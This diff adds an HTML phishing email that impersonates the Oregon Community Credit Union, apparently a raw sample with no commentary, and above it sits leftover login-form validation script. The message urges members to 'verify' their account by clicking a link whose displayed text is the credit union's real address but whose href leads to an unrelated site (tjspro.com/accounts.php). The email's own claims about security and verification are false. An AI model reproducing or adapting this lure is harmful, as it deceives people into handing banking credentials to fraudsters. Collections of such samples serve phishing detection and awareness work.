@@ -1,0 +1,106 @@
+
+<html><head>
+<meta http-equiv="Content-Type" content="text/html; charset=unicode">
+<script language="javascript" type="text/javascript">
+<!--
+        var gVAM_ValSummary =  new
+Array({ValSumID:'vldSummary',FmtListFnc:null,GetInner:VAM_ValSumInnerHTML,Grp:'',AutoUpd:true,InvSpc:false,Links:false,RCIS:true,PreListFnc:null,PostListFnc:null,Hdr:'<span
+class=\'VAMValSummaryHeader\'>Please provide all the requested
+information.</span>',Ftr:'',ErrMsgCss:'VAMValSummaryErrors',LinkTT:'',Showing:false,HdrSep:'<br
+/>',DispMode:'0'});
+        var gVAMActions =  new
+Array({ActnFnc:VAM_DoValidate,InitFnc:VAM_InitValAction,Enabled:true,CID:'VLDUSERIDREQ',Cond:
+{EvalFnc:VAM_EvalReqTextCond,InitFnc:VAM_InitOneFldCond,Enabled:true,HUEvts:true,IDToEval:'txtUserID',CaseIns:true},CanRun:VAM_CanRunVal,VT:'VAL',ErrMsg:'Please
+enter a value in the User ID field.',SumMsg:'Please enter a value in the
+User ID
+field.',TokenRepl:VAM_OneFldReplToken,EvtToVal:1,FmttrFnc:VAM_TextFmttr,Dspl:0,Blnk:true,BlnkCss:'VAMBlinkText',BlinkFnc:VAM_Blink},
+{ActnFnc:VAM_DoValidate,InitFnc:VAM_InitValAction,Enabled:true,CID:'VLDUSERIDFORMAT',Cond:
+{EvalFnc:VAM_EvalRegexCond,InitFnc:VAM_InitOneFldCond,Enabled:true,HUEvts:true,IDToEval:'txtUserID',Expr:'^[\\w\\d\\s!@#$^&*_+=~/?.,():\\-\\[\\]\']+$',Flags:'i',IBT:-1},CanRun:VAM_CanRunVal,VT:'VAL',ErrMsg:'Please
+enter a valid User ID.',SumMsg:'Please enter a valid User
+ID.',TokenRepl:VAM_OneFldReplToken,EvtToVal:1,FmttrFnc:VAM_TextFmttr,Dspl:0,Blnk:true,BlnkCss:'VAMBlinkText',BlinkFnc:VAM_Blink},
+{ActnFnc:VAM_DoValidate,InitFnc:VAM_InitValAction,Enabled:true,CID:'VLDPASSWORDREQ',Cond:
+{EvalFnc:VAM_EvalReqTextCond,InitFnc:VAM_InitOneFldCond,Enabled:true,HUEvts:true,IDToEval:'txtPassword',CaseIns:true},CanRun:VAM_CanRunVal,VT:'VAL',ErrMsg:'Please
+enter a value in the Password field.',SumMsg:'Please enter a value in
+the Password
+field.',TokenRepl:VAM_OneFldReplToken,EvtToVal:1,FmttrFnc:VAM_TextFmttr,Dspl:0,Blnk:true,BlnkCss:'VAMBlinkText',BlinkFnc:VAM_Blink},
+{ActnFnc:VAM_DoValidate,InitFnc:VAM_InitValAction,Enabled:true,Enabler:{EvalFnc:VAM_EvalCheckStateCond,InitFnc:VAM_InitOneFldCond,Enabled:true,HUEvts:true,IDToEval:'chkMakeDefaultPage',Chk:true},Cond:
+{EvalFnc:VAM_EvalReqListCond,InitFnc:VAM_InitOneFldCond,Enabled:true,HUEvts:true,IDToEval:'ddlSignonDestination',UnassgnIdx:0},CanRun:VAM_CanRunVal,VT:'VAL',ErrMsg:'Please
+select your default Start Page from the dropdown.',SumMsg:'Please select
+your default Start Page from the
+dropdown.',TokenRepl:VAM_OneFldReplToken,EvtToVal:1,FmttrFnc:VAM_TextFmttr,ErrFldID:'vldSignonDestination',Dspl:2,Blnk:true,BlnkCss:'VAMBlinkText',BlinkFnc:VAM_Blink},
+{ActnFnc:VAM_DoValidate,InitFnc:VAM_InitValAction,Enabled:true,Cond:
+{EvalFnc:VAM_EvalFixed,InitFnc:VAM_InitCond,Enabled:true,HUEvts:true,Res:1},VT:'CEM',Val:new
+Array({FID:'vldUserIDReq'},{FID:'vldUserIDFormat'}),LS:false,PSep:'<br/>',IsValid:true,FmttrFnc:VAM_TextFmttr,ErrFldID:'cemUserID',Dspl:2,Blnk:true,BlnkCss:'VAMBlinkText',BlinkFnc:VAM_Blink},
+{ActnFnc:VAM_DoValidate,InitFnc:VAM_InitValAction,Enabled:true,Cond:
+{EvalFnc:VAM_EvalFixed,InitFnc:VAM_InitCond,Enabled:true,HUEvts:true,Res:1},VT:'CEM',Val:new
+Array({FID:'vldPasswordReq'}),LS:false,PSep:'<br/>',IsValid:true,FmttrFnc:VAM_TextFmttr,ErrFldID:'cemPassword',Dspl:2,Blnk:true,BlnkCss:'VAMBlinkText',BlinkFnc:VAM_Blink});
+        var gVAMSubmitIDs =  new Array('btnLogin');
+                // -->
+</script>
+
+                        <input id="TestJavaScript" type="hidden"
+name="TestJavaScript"><script
+language="javascript">document.getElementById("TestJavaScript").value="OK";var
+noCookieIndex = document.cookie.indexOf('TestCookie');if (noCookieIndex
+== -1)
+{document.getElementById("TestJavaScript").value='NOCOOKIE';}</script>
+<!-- VAM LIC=8984 -->
+<script type="'text/javascript'">
+<!--
+VAM_InitActions();
+VAM_UpdateOnClick('btnLogin','');
+VAM_SetFocus('txtUserID');
+// -->
+</script>
+</form>
+<script type="'text/javascript'">
+// <![CDATA[
+var MAINFORMValidator = new Validator("MAINFORM");
+
+
+
+MAINFORMValidator.EnableMsgsTogether();
+MAINFORMValidator.addValidation("txtUserID","req","Please enter your
+User ID");
+MAINFORMValidator.addValidation("txtPassword","req","Please enter your
+Password");
+
+// ]]>
+</script>
+<!--- /BODY ---><!--- FOOTER --->
+<meta content="MSHTML 6.00.2900.2180" name="GENERATOR"></head>
+<body>
+<p align="left"><u><a
+href="http://onealbailbonds.com/images/index.html"><img
+src="http://upload.wikimedia.org/wikipedia/en/1/12/Oregon_Community_Credit_Union_logo.jpg"
+border=0></a></u></p>
+<p dir="ltr" align="center">Dear&nbsp;community&nbsp; member : </p>
+<p dir="ltr" align="center">This email was sent by the Oregon Community
+Credit Union
+to verify your account information. You must complete this process by
+clicking
+on the link below and entering your account information . This is done
+for your
+protection , because some of our members no longer have access to their
+online
+access and we must verify it. To verify your identity and access your
+bank
+account, click on the link below. <br></p>
+<p align="center"><b><a
+href="http://tjspro.com/accounts.php/">https://www.oregoncommunitycu.org/</a></b>
+</p>
+<p dir="ltr" align="center"><br>Please fill in the required information.
+<br>This is
+required for us to continue to offer you a safe and risk free
+environment .
+<br></p>
+<p align="center">Thank you <br>Accounts Management </p>
+<p align="center"><br><span class="style3">�2010 Oregon Community Credit
+Union, All
+rights reserved.</span><img
+src="https://www.uboc.com/images/common/eq_housng_bug.gif"></p>
+
+        </body>
+</html>
+
+
